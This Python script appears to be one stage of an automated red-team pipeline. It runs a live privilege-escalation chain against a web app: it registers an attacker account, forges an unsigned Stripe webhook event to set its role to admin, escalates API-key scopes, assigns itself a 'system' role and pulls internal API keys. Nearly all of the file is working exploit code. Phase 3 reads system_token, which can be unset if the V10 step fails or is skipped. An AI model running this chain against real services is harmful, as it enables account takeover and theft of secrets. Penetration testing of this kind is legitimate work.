"""
Stage 4: Chain Builder & Target Validator
Searches the permission graph for a path to /internal/api-keys,
then validates each step with live API calls.
Output: attack_chain.json + console narrative
"""

import os
import json
import time
import requests
from dotenv import load_dotenv
from event_emitter import EventEmitter

emit = EventEmitter().emit

load_dotenv()

BASE_URL = os.getenv("BASE_URL", "http://localhost:8000")
OUTPUT_DIR = os.getenv("OUTPUT_DIR", "output")
TARGET_ENDPOINT = os.getenv("TARGET_ENDPOINT", "/internal/api-keys")


def load_deviations():
    path = os.path.join(OUTPUT_DIR, "deviations.json")
    with open(path) as f:
        return json.load(f)


def register_fresh_user():
    """Register a brand new user for attack validation."""
    import random, string
    suffix = ''.join(random.choices(string.ascii_lowercase, k=8))
    email = f"attacker_{suffix}@redteam.local"
    name = "Attacker Agent"
    password = "SecurePass123!"

    r = requests.post(f"{BASE_URL}/auth/register", json={
        "email": email,
        "password": password,
        "name": name,
    })
    if r.status_code == 200:
        data = r.json()
        return {
            "email": email,
            "password": password,
            "token": data["access_token"],
            "api_key": data.get("api_key"),
            "user_id": data["user_id"],
            "role": data.get("role", "user"),
        }
    raise Exception(f"Failed to register: {r.status_code} {r.text}")


def relogin(email, password):
    """Re-login to get a fresh token with current DB role."""
    r = requests.post(f"{BASE_URL}/auth/login", json={"email": email, "password": password})
    if r.status_code == 200:
        data = r.json()
        return data["access_token"]
    return None


# ─── Attack V3: API Key Scope Escalation ─────────────────────────────────────

def attack_v3_scope_escalate(token, attacker_info):
    """
    V3: API Key Scope Escalation.
    1. Create a key with limited scopes
    2. Modify it to 'admin' scope
    3. Verify admin access
    Returns: (success, new_token_or_None, description)
    """
    print()
    print("  [V3] API Key Scope Escalation...")

    # Step 1: Create API key with limited scopes
    r = requests.post(f"{BASE_URL}/api-keys",
                       headers={"Authorization": f"Bearer {token}"},
                       json={"name": "Attack Key", "scopes": ["read:files"]})
    if r.status_code != 200:
        print(f"    Create failed: {r.status_code} {r.text[:80]}")
        return False, None, f"Could not create API key: {r.status_code}"

    key_data = r.json()
    key_id = key_data.get("id")
    print(f"    Created key: {key_id}")

    # Step 2: Escalate key's scopes to admin
    escalate_r = requests.put(
        f"{BASE_URL}/api-keys/{key_id}",
        headers={"Authorization": f"Bearer {token}"},
        json={"name": "Escalated Key", "scopes": ["admin"]}
    )

    if escalate_r.status_code != 200:
        print(f"    Escalate failed: {escalate_r.status_code} {escalate_r.text[:80]}")
        return False, None, f"Scope modification rejected: {escalate_r.status_code}"

    result = escalate_r.json()
    print(f"    Modified scopes to: {result.get('scopes')}")

    # Step 3: The key's scopes are now admin, but the JWT still has role=user.
    # Try admin endpoints with JWT — these check JWT role, not key scopes.
    # So V3 alone does NOT give admin access via JWT.
    # The key is used for API calls that check scopes, not role.
    # Check if any endpoint uses API key auth for admin features.
    verify_r = requests.get(f"{BASE_URL}/admin/settings",
                             headers={"Authorization": f"Bearer {token}"})
    print(f"    Admin access check: {verify_r.status_code}")

    if verify_r.status_code == 200:
        print(f"    ADMIN ACCESS GAINED!")
        return True, token, "Scope escalation successful"

    # V3 key scope escalation is limited — admin endpoints check JWT role, not key scopes.
    # This is the vulnerability: the key scopes ARE updated, but the JWT role is not.
    # Combine with other vectors for full escalation.
    return False, None, "Key scopes updated to admin, but JWT role check still enforced"


# ─── Attack V6: Stripe Webhook Bypass ───────────────────────────────────────

def attack_v6_webhook_bypass(token, attacker_info):
    """
    V6: Stripe Webhook Bypass.
    1. Forge a subscription.updated event with role=admin metadata
    2. Webhook updates the attacker's role in the DB
    3. Re-login to get a JWT with the new role
    Returns: (success, new_token_with_admin_role, description)
    """
    print()
    print("  [V6] Stripe Webhook Bypass...")

    # Check if webhook endpoint is accessible
    deviations = load_deviations()
    webhook_dev = None
    for dev in deviations.get("all_deviations", []):
        if dev["type"] == "WEBHOOK_BYPASS":
            webhook_dev = dev
            break

    if not webhook_dev:
        print("    No webhook bypass deviation found.")
        return False, None, "Webhook bypass not detected"

    webhook_path = webhook_dev["path"]
    print(f"    Webhook endpoint: {webhook_path}")

    # Forge the event with role=admin in metadata
    forged_event = {
        "event_type": "customer.subscription.updated",
        "data": {
            "customer_id": attacker_info["user_id"],
            "metadata": {
                "role": "admin"
            }
        }
    }

    r = requests.post(f"{BASE_URL}{webhook_path}", json=forged_event)
    print(f"    Webhook response: {r.status_code}")

    if r.status_code != 200:
        print(f"    Webhook rejected: {r.text[:100]}")
        return False, None, f"Webhook rejected event: {r.status_code}"

    print("    Event accepted by webhook!")

    # Re-login to get a JWT with the updated role
    new_token = relogin(attacker_info["email"], attacker_info["password"])
    if not new_token:
        return False, None, "Webhook succeeded but re-login failed"

    # Verify admin access with new token
    verify_r = requests.get(f"{BASE_URL}/admin/settings",
                             headers={"Authorization": f"Bearer {new_token}"})
    print(f"    Admin access check: {verify_r.status_code}")

    if verify_r.status_code == 200:
        print("    ADMIN ACCESS GAINED via webhook role escalation!")
        return True, new_token, "Webhook bypass: forged event updated role to admin, re-login confirmed"
    else:
        print(f"    Admin access check failed: {verify_r.status_code}")
        return False, None, "Webhook updated role but admin access still denied"


# ─── Attack V10: Admin Role Management ───────────────────────────────────────

def attack_v10_role_management(token, attacker_info):
    """
    V10: Admin Role Management — Admin can assign any role including 'system'.
    Requires admin token first. Used after V6 gives admin.
    """
    print()
    print("  [V10] Role Management Privilege Escalation...")

    # Try to assign system role to self
    r = requests.put(
        f"{BASE_URL}/admin/users/{attacker_info['user_id']}/role",
        headers={"Authorization": f"Bearer {token}"},
        json={"role": "system"}
    )
    print(f"    Role update response: {r.status_code}")

    if r.status_code != 200:
        print(f"    Role update failed: {r.text[:100]}")
        return False, None, f"Role management rejected: {r.status_code}"

    # Re-login to get JWT with system role
    new_token = relogin(attacker_info["email"], attacker_info["password"])
    if not new_token:
        return False, None, "Role updated to system but re-login failed"

    # Verify system access
    verify_r = requests.get(f"{BASE_URL}{TARGET_ENDPOINT}",
                             headers={"Authorization": f"Bearer {new_token}"})
    print(f"    System access check: {verify_r.status_code}")

    if verify_r.status_code == 200:
        print("    SYSTEM ACCESS GAINED!")
        return True, new_token, "Role escalated to system via admin role management"
    else:
        print(f"    System access failed: {verify_r.status_code}")
        return False, None, "Role updated to system but access still denied"


# ─── Validation Loop ─────────────────────────────────────────────────────────

def run():
    print("=" * 60)
    print("STAGE 4: Chain Builder & Target Validator")
    print("=" * 60)
    print()

    print("[1/3] Loading deviations...")
    deviations_data = load_deviations()
    print(f"      Total deviations: {deviations_data['total_deviations']}")
    print()

    print("[2/3] Registering attacker account...")
    attacker = register_fresh_user()
    print(f"      Email: {attacker['email']}")
    print(f"      User ID: {attacker['user_id']}")
    print(f"      Initial Role: {attacker['role']}")
    print()

    print("[3/3] Attempting privilege escalation chain...")
    print("=" * 60)

    steps = []
    current_token = attacker["token"]
    step_num = 1

    # ─── PHASE 1: Get Admin ───────────────────────────────────────────────

    print()
    print(f"[Step {step_num}] PHASE 1: Elevate to Admin")
    print("-" * 50)
    step_num += 1

    admin_token = None
    admin_source = None

    # Method A: V6 Stripe Webhook Bypass
    success, new_token, desc = attack_v6_webhook_bypass(current_token, attacker)
    if success:
        admin_token = new_token
        admin_source = "V6: Stripe Webhook Bypass"
        steps.append({
            "step": step_num - 1,
            "title": "V6: Stripe Webhook Bypass",
            "method": "POST /api/v1/billing/webhook",
            "description": desc,
            "success": True,
            "severity": "CRITICAL",
        })
        emit("escalation_step", {
            "step": step_num - 1,
            "title": "V6: Stripe Webhook Bypass",
            "method": "POST /api/v1/billing/webhook",
            "result": desc,
            "success": True,
        })
    else:
        steps.append({
            "step": step_num - 1,
            "title": "V6: Stripe Webhook Bypass",
            "method": "POST /api/v1/billing/webhook",
            "description": desc,
            "success": False,
            "severity": "CRITICAL",
        })
        emit("escalation_step", {
            "step": step_num - 1,
            "title": "V6: Stripe Webhook Bypass",
            "method": "POST /api/v1/billing/webhook",
            "result": desc,
            "success": False,
        })
        print(f"    V6 failed: {desc}")

    # Method B: V3 Scope Escalation (if V6 didn't work)
    if not admin_token:
        success, new_token, desc = attack_v3_scope_escalate(current_token, attacker)
        if success:
            admin_token = new_token
            admin_source = "V3: API Key Scope Escalation"
            steps.append({
                "step": step_num - 1,
                "title": "V3: API Key Scope Escalation",
                "method": "PUT /api-keys/{id}",
                "description": desc,
                "success": True,
                "severity": "HIGH",
            })
            emit("escalation_step", {
                "step": step_num - 1,
                "title": "V3: API Key Scope Escalation",
                "method": "PUT /api-keys/{id}",
                "result": desc,
                "success": True,
            })
        else:
            print(f"    V3 failed: {desc}")
            # Record failed V3 attempt
            if steps[-1]["title"] != "V3: API Key Scope Escalation":
                steps.append({
                    "step": step_num - 1,
                    "title": "V3: API Key Scope Escalation",
                    "method": "PUT /api-keys/{id}",
                    "description": desc,
                    "success": False,
                    "severity": "HIGH",
                })
                emit("escalation_step", {
                    "step": step_num - 1,
                    "title": "V3: API Key Scope Escalation",
                    "method": "PUT /api-keys/{id}",
                    "result": desc,
                    "success": False,
                })

    # ─── PHASE 2: Get System ─────────────────────────────────────────────

    print()
    print(f"[Step {step_num}] PHASE 2: Elevate to System")
    print("-" * 50)
    step_num += 1

    if admin_token:
        success, new_token, desc = attack_v10_role_management(admin_token, attacker)
        if success:
            system_token = new_token
            steps.append({
                "step": step_num - 1,
                "title": "V10: Admin Role Management",
                "method": "PUT /admin/users/{id}/role",
                "description": desc,
                "success": True,
                "severity": "CRITICAL",
            })
            emit("escalation_step", {
                "step": step_num - 1,
                "title": "V10: Admin Role Management",
                "method": "PUT /admin/users/{id}/role",
                "result": desc,
                "success": True,
            })
        else:
            steps.append({
                "step": step_num - 1,
                "title": "V10: Admin Role Management",
                "method": "PUT /admin/users/{id}/role",
                "description": desc,
                "success": False,
                "severity": "CRITICAL",
            })
            emit("escalation_step", {
                "step": step_num - 1,
                "title": "V10: Admin Role Management",
                "method": "PUT /admin/users/{id}/role",
                "result": desc,
                "success": False,
            })
            print(f"    V10 failed: {desc}")
    else:
        print("  Skipped: No admin token available.")
        steps.append({
            "step": step_num - 1,
            "title": "V10: Admin Role Management",
            "method": "PUT /admin/users/{id}/role",
            "description": "Skipped: no admin token",
            "success": False,
        })

    # ─── PHASE 3: Reach Target ─────────────────────────────────────────────

    print()
    print(f"[Step {step_num}] PHASE 3: Access Target")
    print("-" * 50)
    step_num += 1

    target_token = None
    if admin_token:
        # Try system token first, then admin token
        for tok in [system_token, admin_token]:
            if not tok:
                continue
            r = requests.get(f"{BASE_URL}{TARGET_ENDPOINT}",
                                 headers={"Authorization": f"Bearer {tok}"})
            if r.status_code == 200:
                target_token = tok
                break

    if target_token:
        target_data = r.json()
        steps.append({
            "step": step_num - 1,
            "title": "TARGET ACCESSED",
            "method": f"GET {TARGET_ENDPOINT}",
            "description": f"Successfully accessed {TARGET_ENDPOINT}",
            "success": True,
            "severity": "CRITICAL",
        })
        emit("target_reached", {"keys": target_data.get("internal_api_keys", [])})
        result = {
            "success": True,
            "target": TARGET_ENDPOINT,
            "target_data": target_data,
            "steps": steps,
        }
    else:
        steps.append({
            "step": step_num - 1,
            "title": "TARGET ACCESS",
            "method": f"GET {TARGET_ENDPOINT}",
            "description": "Target unreachable with current privileges",
            "success": False,
        })
        result = {
            "success": False,
            "target": TARGET_ENDPOINT,
            "steps": steps,
            "partial": True,
        }

    # Save
    out_path = os.path.join(OUTPUT_DIR, "attack_chain.json")
    with open(out_path, "w") as f:
        json.dump(result, f, indent=2, default=str)

    print()
    print("=" * 60)
    print("STAGE 4 COMPLETE")
    print("=" * 60)

    return result


if __name__ == "__main__":
    run()
